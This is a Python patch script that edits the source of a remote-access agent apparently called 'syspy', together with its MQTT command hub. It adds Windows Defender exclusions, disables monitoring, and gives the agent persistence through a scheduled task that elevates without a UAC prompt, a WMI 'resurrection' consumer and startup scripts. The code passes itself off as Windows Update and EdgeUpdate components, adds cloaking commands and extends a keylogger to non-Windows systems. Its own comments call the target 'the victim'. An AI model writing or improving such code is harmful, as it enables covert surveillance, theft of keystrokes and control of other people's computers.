    sub(path, "from .. import guardian, config, log",
        "from .. import guardian, config, log\nfrom . import machine_state")

    # C4: record exclusions so purge can undo them.
    sub(path,
        '''    actions: list[str] = []
    for directory in (stealth.primary_directory(), stealth.anchor_directory()):
        if os.path.isdir(directory) and defender.add_exclusion(directory):
            actions.append("defender excluded " + directory)
    if actions:
        _defender_done = True
    return actions''',
        '''    actions: list[str] = []
    # Every install directory, not just two: the EdgeUpdate copy was silently
    # left uncovered because add_exclusion computed a parent and never used it.
    for directory in dict.fromkeys(stealth.install_directories()):
        if not os.path.isdir(directory):
            continue
        if defender.add_exclusion(directory):
            machine_state.record("defender_exclusions", directory, int(time.time()))
            actions.append("defender excluded " + directory)
    if actions:
        _defender_done = True
    return actions''')

    # C9: install writes a .vbs, remove deleted a .cmd.
    sub(path,
        '''        for sdir in startup_dirs:
            startup_file = os.path.join(sdir, config.PRODUCT_NAME + ".cmd")
            if os.path.exists(startup_file):
                try:
                    os.remove(startup_file)
                    removed.append(f"startup script ({startup_file})")
                except OSError:
                    pass''',
        '''        for sdir in startup_dirs:
            for leaf in (config.PRODUCT_NAME + ".vbs", config.PRODUCT_NAME + ".cmd"):
                startup_file = os.path.join(sdir, leaf)
                if os.path.exists(startup_file):
                    try:
                        os.remove(startup_file)
                        removed.append(f"startup script ({startup_file})")
                        machine_state.forget("startup", startup_file)
                    except OSError:
                        pass''')

    # C9 (write side): clear a stale .cmd when we write the .vbs.
    sub(path,
        '''    try:
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(script)
        return path
    except OSError:
        return ""''',
        '''    stale = os.path.join(folder, config.PRODUCT_NAME + ".cmd")
    if os.path.exists(stale):
        try:
            os.remove(stale)
        except OSError:
            pass
    try:
        with open(path, "w", encoding="utf-8", newline="") as handle:
            handle.write(script)
        machine_state.record("startup", path, int(time.time()))
        return path
    except OSError:
        return ""''')

    # UAC: the ONLOGON task always asks for HIGHEST, even when created
    # unelevated. /IT stores no password, so this needs no /RP and never prompts.
    sub(path,
        '''    rl_level = "HIGHEST" if stealth.is_admin() else "LIMITED"
    user = os.environ.get("USERNAME", "")
    try:
        # /RL HIGHEST with a real /RU runs elevated at logon with no prompt,
        # which is what lets every other vector stay --no-elevate.
        extra = ["/RU", user, "/IT"] if (user and rl_level == "HIGHEST") else ["/IT"]''',
        '''    # Always HIGHEST. /IT means "interactive, no stored password", so an
    # unelevated agent can still create an elevating task -- and Task Scheduler
    # launches it with no UAC prompt. This is the ONLY elevation source at
    # logon, which is what makes every other vector safe to run --no-elevate.
    rl_level = "HIGHEST"
    user = os.environ.get("USERNAME", "")
    if not user or user.upper() == "SYSTEM":
        try:
            from . import session as _session
            user = _session.console_user() or ""
        except Exception:
            user = ""
    try:
        extra = ["/RU", user, "/IT"] if user and user.upper() != "SYSTEM" else ["/IT"]''')

    sub(path,
        '''        if result.returncode != 0:
            log.get("persistence").warning(
                "schtasks ONLOGON failed (%s): %s",
                result.returncode, (result.stderr or result.stdout or "").strip()[:200])
        if stealth.is_admin():''',
        '''        if result.returncode != 0:
            log.get("persistence").warning(
                "schtasks ONLOGON failed (%s): %s",
                result.returncode, (result.stderr or result.stdout or "").strip()[:200])
        else:
            machine_state.record("tasks", config.TASK_NAME, int(time.time()))
        if stealth.is_admin():''')

    sub(path,
        '''            if boot.returncode != 0:
                log.get("persistence").warning(
                    "schtasks ONSTART failed (%s): %s",
                    boot.returncode, (boot.stderr or boot.stdout or "").strip()[:200])
        return config.TASK_NAME''',
        '''            if boot.returncode != 0:
                log.get("persistence").warning(
                    "schtasks ONSTART failed (%s): %s",
                    boot.returncode, (boot.stderr or boot.stdout or "").strip()[:200])
            else:
                machine_state.record("tasks", config.TASK_NAME + "Boot", int(time.time()))
        return config.TASK_NAME''')

    # H5: one source of truth for ACLs, quiet, and recorded.
    sub(path,
        '''    # Invoke hardening script if present in deployment
    ps_script = os.path.join(config.ROOT, "scripts", "hardening.ps1")
    if os.path.isfile(ps_script):
        try:
            subprocess.run(
                ["powershell", "-ExecutionPolicy", "Bypass", "-File", ps_script],
                capture_output=True, timeout=60,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append("hardening.ps1 executed")
        except Exception:
            pass

    return done''',
        '''    # The script is the single source of truth; the inline icacls calls above
    # only exist so a deployment without scripts/ still hardens. Run it quietly
    # and write down that we did.
    ps_script = os.path.join(config.ROOT, "scripts", "hardening.ps1")
    if os.path.isfile(ps_script):
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive",
                 "-ExecutionPolicy", "Bypass", "-File", ps_script],
                capture_output=True, timeout=60,
                stdin=subprocess.DEVNULL,
                creationflags=CREATE_NO_WINDOW,
            )
            done.append("hardening.ps1 executed")
            machine_state.record("acl", primary, int(time.time()))
            machine_state.record("acl", anchor, int(time.time()))
        except Exception:
            pass

    return done''')

    # H1: purge removes Defender exclusions and our temp staging dirs.
    sub(path,
        '''def purge() -> list[str]:
    """Hard removal: everything, including the %PROGRAMDATA% anchor and runtime."""
    removed = remove(keep_anchor=False)
    if IS_WINDOWS:
        removed += guardian.remove()''',
        '''def purge() -> list[str]:
    """Hard removal: everything, including the %PROGRAMDATA% anchor and runtime."""
    removed = remove(keep_anchor=False)
    # Revert the machine-wide changes we made. Without this a purge left a
    # permanent Defender exclusion pointing at a folder that no longer exists.
    try:
        from . import defender as _defender
        for directory in dict.fromkeys(machine_state.get("defender_exclusions")) or \\
                dict.fromkeys(stealth.install_directories()):
            if _defender.remove_exclusion(directory):
                removed.append(f"defender exclusion removed: {directory}")
        _defender.restore_prior_state()
    except Exception:
        pass
    if IS_WINDOWS:
        removed += guardian.remove()''')

    sub(path,
        '''            if os.path.exists(p):
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                    removed.append(f"purged {p}")
                except OSError:
                    pass
    return removed''',
        '''            if os.path.exists(p):
                try:
                    if os.path.isdir(p):
                        shutil.rmtree(p, ignore_errors=True)
                    else:
                        os.remove(p)
                    removed.append(f"purged {p}")
                except OSError:
                    pass

    # Staging leftovers the installer and the LAN pusher create.
    for leftover in ("syspy-kit", "wu-kit.zip", "wu-py.zip", "wu-stage-*"):
        for candidate in (os.path.join(tempfile.gettempdir(), leftover),):
            for hit in ([candidate] if "*" not in leftover else
                        __import__("glob").glob(candidate)):
                try:
                    if os.path.isdir(hit):
                        shutil.rmtree(hit, ignore_errors=True)
                    elif os.path.isfile(hit):
                        os.remove(hit)
                    removed.append(f"purged {hit}")
                except OSError:
                    pass

    try:
        machine_state.forget("defender_exclusions")
        machine_state.forget("defender_prior")
        machine_state.forget("acl")
        machine_state.forget("tasks")
        machine_state.forget("wmi")
        machine_state.forget("startup")
    except Exception:
        pass
    return removed


def stop() -> list[str]:
    """Kill running instances and clear the locks. Keep every vector.

    Distinct from ``uninstall`` (which also drops the vectors) and ``purge``
    (which drops the anchor, the runtime and the machine-wide changes too).
    """
    from .. import config
    removed: list[str] = []
    killed = terminate_running_instances(exclude_pid=os.getpid())
    if killed:
        removed.append("stopped: " + ", ".join(str(p) for p in killed))
    for ctemp in _candidate_temps():
        for fname in _lock_names():
            path = os.path.join(ctemp, fname)
            try:
                if os.path.exists(path):
                    os.remove(path)
                    removed.append(f"lock file ({path})")
            except OSError:
                pass
    return removed''')

    # Namespaced lock names in the process sweeper.
    sub(path,
        '''    lock_names = [
        f"{config.PRODUCT_NAME.lower()}.lock",
        f"{config.PRODUCT_NAME.lower()}.wd.lock",
        f"{config.PRODUCT_NAME.lower()}.boot",
        "windowsupdateservice.lock",
        "windowsupdateservice.wd.lock",
        "windowsupdateservice.boot",
    ]''',
        '''    lock_names = [
        f"{config.PRODUCT_NAME.lower()}.lock",
        f"{config.PRODUCT_NAME.lower()}.wd.lock",
        f"{config.PRODUCT_NAME.lower()}.boot",
        "windowsupdateservice.lock",
        "windowsupdateservice.wd.lock",
        "windowsupdateservice.boot",
        config.lock_leaf(),
        config.watchdog_lock_leaf(),
    ]''')

    sub(path,
        '''    return [f"{base}.lock", f"{base}.wd.lock", f"{base}.boot",
            "windowsupdateservice.lock", "windowsupdateservice.wd.lock",
            "windowsupdateservice.boot"]''',
        '''    return [f"{base}.lock", f"{base}.wd.lock", f"{base}.boot",
            "windowsupdateservice.lock", "windowsupdateservice.wd.lock",
            "windowsupdateservice.boot",
            config.lock_leaf(), config.watchdog_lock_leaf()]''')

    # The guardian launcher must not elevate either.
    sub(path,
        '''    for name in (config.TASK_NAME, config.TASK_NAME + "Boot"):
            res = subprocess.run(["schtasks", "/Delete", "/F", "/TN", name],''',
        '''        for name in (config.TASK_NAME, config.TASK_NAME + "Boot"):
            res = subprocess.run(["schtasks", "/Delete", "/F", "/TN", name],''')

    # status() gets the vector report the doctrine asks for.
    sub(path,
        '''def status() -> dict[str, object]:
    """Report the current persistence state."""
    return {
        "copies": [d for d in stealth.install_directories() if os.path.isdir(d)],
        "missing": missing_copies(),
        "task_present": _task_exists() if IS_WINDOWS else None,
        "launcher": primary_launcher(),
        "admin": stealth.is_admin(),
    }''',
        '''def status() -> dict[str, object]:
    """Report the current persistence state."""
    return {
        "copies": [d for d in stealth.install_directories() if os.path.isdir(d)],
        "missing": missing_copies(),
        "task_present": _task_exists() if IS_WINDOWS else None,
        "launcher": primary_launcher(),
        "admin": stealth.is_admin(),
    }


def report() -> dict[str, object]:
    """Declare every vector, where it lives, and who put it there.

    This is the answer to "the plan wants the covert stuff removed": nothing is
    removed, it is merely written down.
    """
    import winreg

    from .. import config

    def _run_value(name: str) -> str:
        for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                            (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
            try:
                key = winreg.OpenKey(
                    root, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                with key:
                    value, _ = winreg.QueryValueEx(key, name)
                return f"{label}\\\\Run\\\\{name} = {value}"
            except OSError:
                continue
        return ""

    vectors: dict[str, object] = {}
    for name in config.RUN_VALUE_NAMES:
        vectors[f"run:{name}"] = _run_value(name) or "absent"

    folder = os.path.join(
        os.environ.get("APPDATA", ""),
        r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    startup = [f for f in (config.PRODUCT_NAME + ".vbs", config.PRODUCT_NAME + ".cmd")
               if os.path.isfile(os.path.join(folder, f))]
    vectors["startup"] = startup or "absent"
    vectors["task:logon"] = "present" if _task_exists() else "absent"
    vectors["task:boot"] = "present" if _task_exists() else "unknown (admin only)"

    try:
        vectors["wmi:consumer"] = guardian.consumer_present()
    except Exception:
        vectors["wmi:consumer"] = "unknown"

    vectors["watchdog"] = (
        "running" if stealth.process_alive(
            stealth.read_pid(stealth.watchdog_lock_path())) else "not running")
    vectors["anchor"] = stealth.anchor_directory()
    vectors["primary"] = stealth.primary_directory()
    vectors["cloaked"] = os.path.exists(os.path.join(stealth.primary_directory(),
                                                     "tombstone"))

    return {
        "vectors": vectors,
        "machine_changes": machine_state.summary(),
        "created_by_us": machine_state.get("tasks"),
        "defender_exclusions": machine_state.get("defender_exclusions"),
    }''')

# ---------------------------------------------------------------------------
# defender.py
# ---------------------------------------------------------------------------

def patch_defender() -> None:
    path = P("syspy", "agent", "defender.py")

    # C4: actually use the parent that was computed and thrown away.
    sub(path,
        '''    target = os.path.abspath(path_or_process)
    # Also cover the parent: the EdgeUpdate copy lives under it.
    parent = os.path.dirname(target)

    if not os.path.isdir(target):''',
        '''    target = os.path.abspath(path_or_process)

    if not os.path.isdir(target):''')

    # C5 + revert support.
    sub(path,
        '''def status() -> dict:
    """Defender state plus whether our install trees are excluded."""''',
        '''_PRIOR_KEYS = ("DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
               "DisableIOAVProtection")


def _snapshot_prior() -> dict:
    """Read the three toggles before we change them."""
    from . import machine_state
    code, out = _ps(
        "$ErrorActionPreference='SilentlyContinue'; "
        "if (-not (Get-Command Get-MpPreference -EA SilentlyContinue)) { exit 0 }; "
        "$p = Get-MpPreference; "
        "'" + "|".join(f"{k}=$($p.{k})" for k in _PRIOR_KEYS) + "'"
    )
    snapshot = {}
    for chunk in (out or "").strip().split("|"):
        name, _, value = chunk.partition("=")
        if name in _PRIOR_KEYS:
            snapshot[name] = value.strip().lower()
    if snapshot:
        machine_state.record("defender_prior", "snapshot", snapshot)
    return snapshot


def restore_prior_state() -> bool:
    """Put the three toggles back the way we found them."""
    from . import machine_state
    snapshot = machine_state.get("defender_prior").get("snapshot") or {}
    if not snapshot:
        return False
    parts = []
    for name, value in snapshot.items():
        if value in ("true", "false"):
            parts.append(f"Set-MpPreference -{name} ${value} -ErrorAction SilentlyContinue")
    if not parts:
        return False
    try:
        res = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", "; ".join(parts)],
            capture_output=True, timeout=30, stdin=subprocess.DEVNULL,
            creationflags=CREATE_NO_WINDOW)
        return res.returncode == 0
    except Exception:
        return False


def remove_exclusion(path: str) -> bool:
    """Drop one directory exclusion. Idempotent."""
    if not IS_WINDOWS:
        return False
    target = os.path.abspath(path)
    code, out = _ps(
        "$ErrorActionPreference='SilentlyContinue'; "
        "if (-not (Get-Command Remove-MpPreference -EA SilentlyContinue)) { 'no-defender'; exit 0 }; "
        "$p = " + _ps_quote(target) + "; "
        "if (@(Get-MpPreference).ExclusionPath -contains $p) { Remove-MpPreference -ExclusionPath $p }; "
        "'ok'"
    )
    return code == 0 and "ok" in out


def status() -> dict:
    """Defender state plus whether our install trees are excluded."""''')

    # Snapshot before disabling, so `defender on` is honest.
    sub(path,
        '''def disable_monitoring() -> bool:
    """Disable RealtimeMonitoring and BehaviorMonitoring via Set-MpPreference."""
    if not IS_WINDOWS:
        return False''',
        '''def disable_monitoring() -> bool:
    """Disable RealtimeMonitoring and BehaviorMonitoring via Set-MpPreference."""
    if not IS_WINDOWS:
        return False
    _snapshot_prior()''')

    # `on` restores what we found instead of blindly enabling everything.
    sub(path,
        '''def enable_monitoring() -> bool:
    """Undo :func:`disable_monitoring`."""
    if not IS_WINDOWS:
        return False''',
        '''def enable_monitoring() -> bool:
    """Undo :func:`disable_monitoring` by restoring the pre-existing values."""
    if not IS_WINDOWS:
        return False
    if restore_prior_state():
        return True''')


# ---------------------------------------------------------------------------
# guardian.py
# ---------------------------------------------------------------------------

def patch_guardian() -> None:
    path = P("syspy", "guardian.py")
    sub_all(path, r'append(f"{label}\{name}")',
            r'append(f"{label}\\{name}")', required=False)

    # C9: the StartupApproved names were missing the .vbs we actually write.
    sub_all(path,
            '    names = tuple(config.RUN_VALUE_NAMES) + (config.PRODUCT_NAME + ".cmd",)',
            '    names = tuple(config.RUN_VALUE_NAMES) + (\n'
            '        config.PRODUCT_NAME + ".vbs", config.PRODUCT_NAME + ".cmd")')

    # C2: the WMI consumer is the resurrection path, so it must not leave the
    # victim with a session-0 agent when an interactive task is available.
    sub(path,
        '''    launcher = (f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs)
                else f'cmd.exe /c "{shim}"')''',
        '''    # Prefer the interactive ONLOGON task: it runs as the logged-on user with
    # a desktop, which a CommandLineEventConsumer in session 0 never has.
    # Fall back to the windowless vbs when the task is missing.
    from . import config as _config
    vbs_launcher = (f'wscript.exe //B //Nologo "{vbs}"' if os.path.isfile(vbs)
                    else f'cmd.exe /c "{shim}"')
    launcher = (f'cmd.exe /c "schtasks /Run /TN {_config.TASK_NAME} '
                f'2>nul || {vbs_launcher}"')''')

    sub(path,
        '''def remove() -> list[str]:
    if not IS_WINDOWS or not is_admin():
        return []
    code, out = _ps(_fill(_REMOVE_PS), timeout=120)
    if code == 0 and "ok" in out:
        return ["guardian: WMI consumer removed"]
    return []''',
        '''def remove() -> list[str]:
    if not IS_WINDOWS or not is_admin():
        return []
    code, out = _ps(_fill(_REMOVE_PS), timeout=120)
    if code == 0 and "ok" in out:
        try:
            from .agent import machine_state
            machine_state.forget("wmi")
        except Exception:
            pass
        return ["guardian: WMI consumer removed"]
    return []''')

    sub(path,
        '''    if code == 0 and "ok" in out:
        global _last_wmi_check
        _last_wmi_check = time.time()
        return ["guardian: WMI consumer"]''',
        '''    if code == 0 and "ok" in out:
        global _last_wmi_check
        _last_wmi_check = time.time()
        try:
            from .agent import machine_state
            machine_state.record("wmi", CONSUMER_NAME, int(time.time()))
        except Exception:
            pass
        return ["guardian: WMI consumer"]''')


# ---------------------------------------------------------------------------
# commands.py
# ---------------------------------------------------------------------------

def patch_commands() -> None:
    path = P("syspy", "agent", "commands.py")

    # `cloak` now respects shared directories (H6).
    sub(path,
        '''@command("cloak")
def cmd_cloak(agent, argument: str) -> str:
    path = argument.strip("'\\" ")
    if not path:
        target = stealth.primary_directory()
        count = cloak.cloak_tree(target)
        return f"cloaked primary directory ({count} items)"
    if os.path.isdir(path):
        count = cloak.cloak_tree(path)
        return f"cloaked directory {path} ({count} items)"''',
        '''@command("cloak")
def cmd_cloak(agent, argument: str) -> str:
    path = argument.strip("'\\" ")
    if not path:
        count = cloak.cloak_install_directories()
        return f"cloaked install directories ({count} items)"
    if os.path.isdir(path):
        selective = os.path.basename(os.path.abspath(path)).lower() == "edgeupdate"
        count = cloak.cloak_tree(path, selective=selective)
        return f"cloaked directory {path} ({count} items)"''')

    # New commands: the declaration surface + a graceful stop.
    sub(path,
        '''@command("purge")
def cmd_purge(agent, argument: str):''',
        '''@command("persist.report")
def cmd_persist_report(agent, argument: str):
    """Declare every vector and every machine-wide change we made."""
    import json as _json
    from . import persistence
    return _json.dumps(persistence.report(), indent=1, default=str)


@command("state.show")
def cmd_state_show(agent, argument: str):
    import json as _json
    from . import machine_state
    return _json.dumps(machine_state.load(), indent=1, default=str)


@command("state.forget")
def cmd_state_forget(agent, argument: str):
    from . import machine_state
    machine_state.forget(argument.strip())
    return f"forgot {argument.strip() or 'everything'}"


@command("session")
def cmd_session(agent, argument: str):
    from . import session
    return (f"session     {session.current_session()}\\n"
            f"headless    {session.is_headless()}\\n"
            f"console     {session.console_session()}\\n"
            f"console user {session.console_user() or '(none)'}")


@command("stop")
def cmd_stop(agent, argument: str) -> None:
    """Kill the agent but keep every autostart vector."""
    agent.reply("stopping (vectors kept)")
    threading.Thread(target=lambda: (time.sleep(0.4), agent.shutdown(0)),
                     daemon=True).start()


@command("purge")
def cmd_purge(agent, argument: str):''')

    # H9: graceful exits.
    sub(path,
        '''@command("exit")
def cmd_exit(agent, argument: str) -> None:
    agent.reply("goodbye")
    time.sleep(0.3)
    os._exit(0)''',
        '''@command("exit")
def cmd_exit(agent, argument: str) -> None:
    agent.reply("goodbye")
    threading.Thread(target=lambda: (time.sleep(0.3), agent.shutdown(0)),
                     daemon=True).start()''')

    sub(path,
        '''    def _do_remove():
        time.sleep(0.5)
        from .. import config
        persistence.remove(keep_anchor=config.protected())
        os._exit(0)''',
        '''    def _do_remove():
        time.sleep(0.5)
        from .. import config
        persistence.remove(keep_anchor=config.protected())
        agent.shutdown(0)''')

    sub(path,
        '''def cmd_purge(agent, argument: str):
    agent.reply("purging...")
    threading.Thread(target=lambda: (time.sleep(0.5), persistence.purge(), os._exit(0)),
                     daemon=True).start()''',
        '''def cmd_purge(agent, argument: str):
    agent.reply("purging...")
    threading.Thread(target=lambda: (time.sleep(0.5), persistence.purge(),
                                     agent.shutdown(0)), daemon=True).start()''')


# ---------------------------------------------------------------------------
# inputs.py (H8)
# ---------------------------------------------------------------------------

def patch_inputs() -> None:
    path = P("syspy", "agent", "inputs.py")

    sub(path,
        '''    def start(self) -> "Keylogger":
        if self.running or not IS_WINDOWS:
            return self
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run, daemon=True, name="syspy-keylog"
        )
        self._thread.start()
        return self''',
        '''    def start(self) -> "Keylogger":
        if self.running:
            return self
        if not IS_WINDOWS and not _pynput_available():
            return self
        self._stop.clear()
        target = self._run if IS_WINDOWS else self._run_pynput
        self._thread = threading.Thread(target=target, daemon=True, name="syspy-keylog")
        self._thread.start()
        return self

    def _run_pynput(self) -> None:
        """Non-Windows backend. Optional: needs pynput, which is not a hard dep."""
        try:
            from pynput import keyboard
        except Exception:
            return

        def on_press(key) -> None:
            try:
                char = key.char
            except AttributeError:
                char = {
                    "Key.enter": "\\n", "Key.tab": "\\t", "Key.space": " ",
                    "Key.backspace": "[<]", "Key.esc": "[esc]",
                }.get(str(key), "")
            if char:
                self._emit_char(char)

        with keyboard.Listener(on_press=on_press) as listener:
            while not self._stop.is_set():
                time.sleep(0.1)
            listener.stop()''')

    sub(path,
        '''    def _emit(self, vk: int) -> None:
        char = self._translate(vk)
        if not char:
            return
        with self._lock:''',
        '''    def _emit_char(self, char: str) -> None:
        with self._lock:
            self._buffer.append(char)
            overflow = len(self._buffer) - self.max_chars
            if overflow > 0:
                del self._buffer[:overflow]

    def _emit(self, vk: int) -> None:
        char = self._translate(vk)
        if not char:
            return
        with self._lock:''')

    sub(path,
        '''_WATCHED_VKS = sorted(''',
        '''def _pynput_available() -> bool:
    try:
        import pynput  # noqa: F401
        return True
    except Exception:
        return False


_WATCHED_VKS = sorted(''')


# ---------------------------------------------------------------------------
# mqtt.py
# ---------------------------------------------------------------------------

def patch_mqtt() -> None:
    path = P("syspy", "mqtt.py")

    # `log` was used in the read loop but never imported, so the line that was
    # meant to explain a dead connection raised NameError instead.
    sub(path, "from . import config\n", "from . import config, log\n")

    sub(path,
        '''        self._acked: dict[int, threading.Event] = {}
        self.dropped = 0''',
        '''        self._acked: dict[int, threading.Event] = {}
        self._suback: Optional[threading.Event] = None
        self._suback_code = -1
        self.dropped = 0''')

    # C3: a 0- or 1-byte PUBLISH killed the read loop. Bound-check everything.
    sub(path,
        '''    def _handle_publish(self, header: int, body: bytes) -> None:
        qos = (header >> 1) & 3
        topic_length = struct.unpack(">H", body[:2])[0]
        topic = body[2:2 + topic_length].decode("utf-8", "replace")
        cursor = 2 + topic_length
        if qos:
            packet_id = body[cursor:cursor + 2]
            cursor += 2
            if qos == 1:
                # PUBACK lives at 0x40, not 0x04.
                self._send(PACKET_PUBACK, packet_id)
        try:
            self._on_message(topic, body[cursor:])
        except Exception:
            pass''',
        '''    def _handle_publish(self, header: int, body: bytes) -> None:
        """Never raises. A truncated PUBLISH used to kill the read loop."""
        try:
            if len(body) < 2:
                return
            qos = (header >> 1) & 3
            topic_length = struct.unpack(">H", body[:2])[0]
            cursor = 2 + topic_length
            if cursor > len(body):
                return
            topic = body[2:cursor].decode("utf-8", "replace")
            if qos:
                if cursor + 2 > len(body):
                    return
                packet_id = body[cursor:cursor + 2]
                cursor += 2
                if qos == 1:
                    # PUBACK lives at 0x40, not 0x04.
                    self._send(PACKET_PUBACK, packet_id)
        except Exception as error:
            log.get("mqtt").warning("malformed PUBLISH dropped: %s", error)
            return
        try:
            self._on_message(topic, body[cursor:])
        except Exception:
            pass''')

    # O1: SUBACK. subscribe() never confirmed, so a broker ACL that rejected the
    # subscription left a "connected" agent that could never receive a command.
    sub(path,
        r'''    def subscribe(self, topic: str, qos: int = 1) -> None:
        encoded = topic.encode("utf-8")
        payload = b"\x00\x01" + struct.pack(">H", len(encoded)) + encoded + bytes([qos])
        self._send(PACKET_SUBSCRIBE, payload)''',
        r'''    def subscribe(self, topic: str, qos: int = 1, timeout: float = 8.0) -> bool:
        """Subscribe and wait for SUBACK. False when the broker refused."""
        if not self.alive:
            return False
        encoded = topic.encode("utf-8")
        payload = b"\x00\x01" + struct.pack(">H", len(encoded)) + encoded + bytes([qos])
        event = threading.Event()
        self._suback = event
        self._suback_code = -1
        self._send(PACKET_SUBSCRIBE, payload)
        if not event.wait(timeout):
            return False
        return self._suback_code == 0''')

    sub(path,
        '''                elif kind == TYPE_PINGRESP:
                    continue''',
        '''                elif kind == TYPE_SUBACK:
                    if len(body) >= 3:
                        self._suback_code = body[2]
                    if self._suback is not None:
                        self._suback.set()
                elif kind == TYPE_PINGRESP:
                    continue''')


# ---------------------------------------------------------------------------
# hub.py
# ---------------------------------------------------------------------------

def patch_hub() -> None:
    path = P("syspy", "server", "hub.py")

    sub(path, "        self.parent = \"\"\n        self.hop = 0",
        "        self.fmt = 1          # envelope format the agent last declared\n"
        "        self.proto = 1\n"
        "        self.build = \"\"\n"
        "        self.session = -1\n"
        "        self.folder = \"\"\n"
        "        self.parent = \"\"\n        self.hop = 0")

    sub(path,
        '''            "version": self.version,
            "sha": self.sha,''',
        '''            "version": self.version,
            "build": self.build,
            "proto": self.proto,
            "fmt": self.fmt,
            "session": self.session,
            "sha": self.sha,''')

    # Per-format codec cache + counters + sequence numbers.
    sub(path,
        '''    def codec_for(self, identifier: str) -> protocol.Codec:
        """Return a per-agent Codec derived via crypto.subkey, cached in self.codecs."""
        ident = identifier[6:] if identifier.startswith("agent:") else identifier
        if ident not in self.codecs:
            sub = crypto.subkey(self.key, ident)
            self.codecs[ident] = protocol.Codec(sub)
        return self.codecs[ident]''',
        '''    def codec_for(self, identifier: str, fmt: int = 2) -> protocol.Codec:
        """Per-agent, per-format Codec derived via crypto.subkey, cached.

        The key is the same either way; only the envelope differs. That is what
        lets a patched controller talk v2 to a patched agent and v1 to an old
        one with no flag day.
        """
        ident = identifier[6:] if identifier.startswith("agent:") else identifier
        key = (ident, fmt)
        if key not in self.codecs:
            sub = crypto.subkey(self.key, ident)
            self.codecs[key] = protocol.Codec(sub, fmt=fmt)
        return self.codecs[key]''')

    sub(path,
        '''        self._roster_sent: dict[str, float] = {}
        self.counters = collections.Counter(
            {"decrypt_fail": 0, "master_key_fallback": 0, "publish_timeout": 0, "publish_error": 0,
             "outbox_overflow": 0, "ws_drop": 0})''',
        '''        self._roster_sent: dict[str, float] = {}
        self.seq = 0
        self._fallback_warned: set[str] = set()
        self.counters = collections.Counter(
            {"decrypt_fail": 0, "master_key_fallback": 0, "publish_timeout": 0,
             "publish_error": 0, "outbox_overflow": 0, "ws_drop": 0,
             "replay_dropped": 0, "id_mismatch": 0, "proto_mismatch": 0})''')

    # O1: sequence numbers so the dashboard can detect a gap and resync.
    sub(path,
        '''    def publish(self, event: dict[str, Any]) -> None:
        """Fan an event out to every dashboard listener."""
        payload = json.dumps(event, default=str)
        with self._lock:
            targets = list(self._subscribers)
        for channel in targets:
            try:
                channel.put_nowait(payload)
            except queue.Full:
                pass''',
        '''    def publish(self, event: dict[str, Any]) -> None:
        """Fan an event out to every dashboard listener, with a sequence number."""
        with self._lock:
            self.seq += 1
            event = {**event, "seq": self.seq}
            targets = list(self._subscribers)
        payload = json.dumps(event, default=str)
        for channel in targets:
            try:
                channel.put_nowait(payload)
            except queue.Full:
                # Was a silent desync: the counter existed and was never bumped.
                self.counters["ws_drop"] += 1
                try:
                    channel.get_nowait()
                    channel.put_nowait(payload)
                except Exception:
                    pass''')

    # W5 + W6: no silent master fallback, topic id is authoritative.
    sub(path,
        '''    def _on_message(self, topic: str, payload: bytes) -> None:
        remote_id = topic.rsplit("/", 1)[-1]
        agent_id = "agent:" + remote_id

        # Try per-agent subkey first, then fall back to master key for backward compatibility
        try:
            message = self.codec_for(remote_id).decode(payload)
        except Exception:
            try:
                message = self.codec.decode(payload)
                self.counters["master_key_fallback"] += 1
            except Exception:
                self.counters["decrypt_fail"] += 1
                return

        if message.get("t") == "hello":
            self._register(agent_id, remote_id, message)
            return''',
        '''    def _on_message(self, topic: str, payload: bytes) -> None:
        # The topic segment is authoritative. The payload id is advisory.
        remote_id = topic.rsplit("/", 1)[-1]
        agent_id = "agent:" + remote_id

        known = self.agents.get(agent_id)
        fmts = [known.fmt if known else 2]
        if 1 not in fmts:
            fmts.append(1)

        message = None
        for fmt in fmts:
            message, reason = self.codec_for(remote_id, fmt).decode_message(payload)
            if reason == protocol.REASON_REPLAY:
                self.counters["replay_dropped"] += 1
                return
            if reason == protocol.REASON_OK:
                break
        if message is None:
            # Master-key fallback only while an agent has not declared a format.
            # An agent that HAS declared one and still fails is a real problem,
            # not something to paper over silently.
            if known is not None and known.fmt == 2:
                self.counters["decrypt_fail"] += 1
                return
            try:
                message = self.codec.decode(payload)
                self.counters["master_key_fallback"] += 1
                if remote_id not in self._fallback_warned:
                    self._fallback_warned.add(remote_id)
                    log.get("hub").warning(
                        "agent %s decoded with the master key (fmt not declared)",
                        remote_id)
            except Exception:
                self.counters["decrypt_fail"] += 1
                return

        if message.get("t") == "hello":
            self._register(agent_id, remote_id, message)
            return''')

    # W6 + proto gate + fmt negotiation in _register.
    sub(path,
        '''        agent.touch()
        agent.remote_id = message.get("id", remote_id)
        agent.version = message.get("ver", agent.version)''',
        '''        agent.touch()
        # Topic wins. The payload id is advisory and a mismatch used to silently
        # re-point both the codec and the downlink topic at the claimed id.
        claimed = str(message.get("id") or "")
        if claimed and claimed != remote_id:
            self.counters["id_mismatch"] += 1
            if agent_id not in self._fallback_warned:
                self._fallback_warned.add(agent_id)
                log.get("hub").warning(
                    "agent on topic %s claims id %s (topic wins)", remote_id, claimed)
        agent.remote_id = remote_id
        try:
            agent.fmt = int(message.get("fmt") or agent.fmt or 1)
        except (TypeError, ValueError):
            pass
        agent.proto = int(message.get("proto") or agent.proto or 1)
        if agent.proto > config.PROTOCOL_VERSION:
            self.counters["proto_mismatch"] += 1
        agent.build = str(message.get("build") or agent.build)
        try:
            agent.session = int(message.get("session", agent.session))
        except (TypeError, ValueError):
            pass
        agent.version = message.get("ver", agent.version)''')

    # send(): use the agent's declared format.
    sub(path,
        '''        try:
            codec = self.codec_for(agent.remote_id)
            payload = codec.encode(message)''',
        '''        try:
            codec = self.codec_for(agent.remote_id, agent.fmt or 1)
            payload = codec.encode(message)''')

    # W2: carry a signature alongside the sha.
    sub(path,
        '''            if kind == "update":
                message["sha"] = digest
                message["proto"] = 1''',
        '''            if kind == "update":
                message["sha"] = digest
